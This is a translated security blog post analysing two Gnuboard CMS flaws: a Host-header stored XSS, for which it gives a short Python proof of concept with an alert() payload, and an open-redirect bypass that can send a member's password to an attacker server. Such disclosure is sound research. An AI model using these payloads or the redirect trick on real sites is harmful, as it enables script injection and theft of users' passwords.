原文地址：<http://blog.adm1nkyj.kr>  
译者：欧巴@知道创宇404实验室

#### 简介

Gnuboard是韩国Sir公司开发一套PHP+Mysql CMS程序。
本身数据结构简单，可扩展性能强，程序运行代码与皮肤文件分离，可扩展数据字段多，可以进行多种功能转变，简单安装就可以作为BBS告示板使用，也可以下载皮肤插件变成
综合网站，地方信息，购物，人才市场，物品交易网站。

#### Gnuboard stored xss

之前记录的一个漏洞，漏洞触发点比较有趣，而且威胁也大，所以就发到博客。

首先看一下 index.php代码

    
    
    <div style="float:left;<?php echo $lt_style ?>">
        <?php
        // 이 함수가 바로 최신글을 추출하는 역할을 합니다.
        // 사용방법 : latest(스킨, 게시판아이디, 출력라인, 글자수);
        // 테마의 스킨을 사용하려면 theme/basic 과 같이 지정
        echo latest("basic", $row['bo_table'], 5, 25);
        ?>
    </div>

用`latest`过滤之后echo输出，如果是以前，就会跳过这个漏洞点，但是因为缺钱，所以跟了一下代码。

跟一下`lib/latest.lib.php`文件

    
    
    if(G5_USE_CACHE) {
        $cache_file = G5_DATA_PATH."/cache/latest-{$bo_table}-{$skin_dir}-{$rows}-{$subject_len}.php";
    
        if(!file_exists($cache_file)) {
            $cache_fwrite = true;
        } else {
            if($cache_time > 0) {
                $filetime = filemtime($cache_file);
                if($filetime && $filetime < (G5_SERVER_TIME - 3600 * $cache_time)) {
                    @unlink($cache_file);
                    $cache_fwrite = true;
                }
            }
    
            if(!$cache_fwrite)
                include($cache_file);
        }
    }
    
    if(!G5_USE_CACHE || $cache_fwrite) {
        $list = array();
    
        $sql = " select * from {$g5['board_table']} where bo_table = '{$bo_table}' ";
        $board = sql_fetch($sql);
        $bo_subject = get_text($board['bo_subject']);
    
        $tmp_write_table = $g5['write_prefix'] . $bo_table; // 게시판 테이블 전체이름
        $sql = " select * from {$tmp_write_table} where wr_is_comment = 0 order by wr_num limit 0, {$rows} ";
        $result = sql_query($sql);
        for ($i=0; $row = sql_fetch_array($result); $i++) {
            $list[$i] = get_list($row, $board, $latest_skin_url, $subject_len);
        }
    
        if($cache_fwrite) {
            $handle = fopen($cache_file, 'w');
            $cache_content = "<?php\nif (!defined('_GNUBOARD_')) exit;\n\$bo_subject='".sql_escape_string($bo_subject)."';\n\$list=".var_export($list, true)."?>";
            fwrite($handle, $cache_content);
            fclose($handle);
        }
    }
    
    ob_start();
    include $latest_skin_path.'/latest.skin.php';
    $content = ob_get_contents();
    ob_end_clean();
    
    return $content;

看代码能发现，如果存在缓存文件，那就直接包含已存在的缓存，如果没有那就生成一个缓存文件之后，再调用缓存。

生成缓存的时候会传入`$latest_skin_url`函数，`$latest_skin_url`函数会包含`G5_SKIN_URL`的值。`G5_SKIN_URL`的值在
`common.php`文件的`g5_path()`的函数中会包含 host头的值，导致xss漏洞。

漏洞复现：

为了初始化缓存，先发一篇文章，然后跳转到index.php的时候 修改host值为 `"><img src=1
onerror="alert('XSS');">`

![](https://images.seebug.org/content/images/2017/11/dd22af0d-8717-48fc-af44-dfe7704a4cd8.png-w331s)

PoC :

    
    
    import requests
    from urllib import quote
    
    header = {"Host":"\"><img src=1 onerror=\"alert('XSS');\">"}
    
    url = "site_url"
    
    r = requests.get(url, headers=header)
    print r.text

#### Gnuboard open redirect & password leak

为了参加 hacking camp的演讲，准备open
redirect漏洞的案例的时候，想起之前朋友挖过的gnuboard的漏洞，然后现在看了一下，虽然有补丁但是还是存在漏洞。

在 `skin/member/basic/member_confirm_skin.php`文件。

    
    
     <form name="fmemberconfirm" action="<?php echo $url ?>" onsubmit="return fmemberconfirm_submit(this);" method="post">
        <input type="hidden" name="mb_id" value="<?php echo $member['mb_id'] ?>">
        <input type="hidden" name="w" value="u">
    
        <fieldset>
            회원아이디
            <span id="mb_confirm_id"><?php echo $member['mb_id'] ?></span>
    
            <label for="confirm_mb_password">비밀번호<strong class="sound_only">필수</strong></label>
            <input type="password" name="mb_password" id="confirm_mb_password" required class="required frm_input" size="15" maxLength="20">
            <input type="submit" value="확인" id="btn_submit" class="btn_submit">
        </fieldset>
    
        </form>

可以看到在form表单里 输出了 `url`，如果url改成
`http://hacker.com`，黑客会截取form表单里的所有的值。从上述代码可以看到，form表单里包含了 `password`的值。

接着我们继续查找从哪个文件调用了上述的`member_confirm_skin.php`文件。我们发现在`bbs/member_confirm.php`文件中调用了。

    
    
    $url = clean_xss_tags($_GET['url']);
    
    // url 체크
    check_url_host($url);
    
    $url = get_text($url);
    
    include_once($member_skin_path.'/member_confirm.skin.php');
    
    include_once('./_tail.sub.php');
    ?>

但是这里看到对 `url`参数进行了过滤，继续跟踪看看`check_url_host`，函数是如何进行过滤的。

    
    
    function check_url_host($url, $msg='', $return_url=G5_URL)
    {
        if(!$msg)
            $msg = 'url에 타 도메인을 지정할 수 없습니다.';
    
        $p = @parse_url($url);
        $host = preg_replace('/:[0-9]+$/', '', $_SERVER['HTTP_HOST']);
    
    
        if(stripos($url, 'http:') !== false) {
            if(!isset($p['scheme']) || !$p['scheme'] || !isset($p['host']) || !$p['host'])
                alert('url 정보가 올바르지 않습니다.', $return_url);
        }
    
    
    
        if ((isset($p['scheme']) && $p['scheme']) || (isset($p['host']) && $p['host']) || $is_host_check) {
            //if ($p['host'].(isset($p['port']) ? ':'.$p['port'] : '') != $_SERVER['HTTP_HOST']) {
            if ( ($p['host'] != $host) || $is_host_check ) {
                echo '<script>'.PHP_EOL;
                echo 'alert("url에 타 도메인을 지정할 수 없습니다.");'.PHP_EOL;
                echo 'document.location.href = "'.$return_url.'";'.PHP_EOL;
                echo '</script>'.PHP_EOL;
                echo '<noscript>'.PHP_EOL;
                echo '<p>'.$msg.'</p>'.PHP_EOL;
                echo '<p><a href="'.$return_url.'">돌아가기</a></p>'.PHP_EOL;
                echo '</noscript>'.PHP_EOL;
                exit;
            }
        }
    }

看到这里发现之前多虑了，因为发现`parse_url`函数基本没有过滤。绕过方法参见下图。

![](https://images.seebug.org/content/images/2017/11/b6d1126a-0cda-4270-a813-a9700addd3d2.png-w331s)
![](https://images.seebug.org/content/images/2017/11/b8e1d4e9-3846-429c-be79-26b803a0055d.png-w331s)

如果用这种方式构造url后，发送链接给会员输入密码，那么密码会发送到攻击者指定的服务器中（因为网址和实际网址一样，所以成功欺骗的概率会更高一些）

![](https://images.seebug.org/content/images/2017/11/8ff761e2-8913-4518-af41-559a56ddaf9b.png-w331s)
![](https://images.seebug.org/content/images/2017/11/d0c4466b-57f1-4b7d-83bb-95695bc4ae97.png-w331s)

* * *

![Paper](https://images.seebug.org/content/images/2017/08/0e69b04c-e31f-4884-8091-24ec334fbd7e.jpeg)
本文由 Seebug Paper 发布，如需转载请注明来源。本文地址：<https://paper.seebug.org/463/>

